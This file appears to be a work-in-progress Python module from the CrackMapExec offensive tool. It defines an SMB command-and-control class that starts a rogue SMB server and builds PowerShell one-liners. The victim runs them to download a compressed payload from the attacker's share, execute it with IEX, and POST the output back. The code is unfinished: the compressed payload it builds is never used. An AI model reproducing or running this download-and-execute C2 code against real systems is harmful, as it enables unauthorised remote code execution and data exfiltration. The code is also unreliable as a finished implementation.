# Work in progress

import logging
from gevent import sleep
from cme.c2 import C2
from cme.servers.smb import CMESMBServer
from cme.helpers.powershell import ps_deflate_and_encode, ps_decode_and_inflate
from cme.helpers.misc import gen_random_string


class Smb(C2):

    smb_server = CMESMBServer()
    smb_server.start()

    def __init__(self, proto, payload, exec_methods, force_ps32, ret_output):
        C2.__init__(self, proto, payload, exec_methods, force_ps32, ret_output)

        self.filename = gen_random_string(8)
        self.post_path = gen_random_string(8)
        self.output = None

        self.command_with_output = "$payload = (New-Object Net.WebClient).DownloadString('file://{local_ip}/CME/{filename}'); " \
                                   "$out = Invoke-Compress -Data (IEX (Invoke-Decompress -Data $payload) | Out-String);" \
                                   "$request = [System.Net.WebRequest]::Create('file://{local_ip}/CME/{post_path}'); " \
                                   "$request.Method = 'POST'; " \
                                   "$request.ContentType = 'application/x-www-form-urlencoded'; " \
                                   "$bytes = [System.Text.Encoding]::ASCII.GetBytes($out); " \
                                   "$request.ContentLength = $bytes.Length; " \
                                   "$requestStream = $request.GetRequestStream(); " \
                                   "$requestStream.Write($bytes, 0, $bytes.Length); " \
                                   "$requestStream.Close(); " \
                                   "$request.GetResponse()".format(local_ip=self.proto.local_ip, filename=self.filename, post_path=self.post_path)

        self.command_without_output = "IEX (Invoke-Decompress -Data (New-Object Net.WebClient).DownloadString('file://{local_ip}/CME/{filename}'));".format(local_ip=self.proto.local_ip,
                                                                                                                                                            filename=self.filename)

    def run(self):
        compressed_payload = ps_deflate_and_encode(self.create_ps_payload(self.payload))

        self.execute_command(self.command_with_output if self.ret_output else self.command_without_output)

        while not self.output:
            sleep(1)

        return self.output
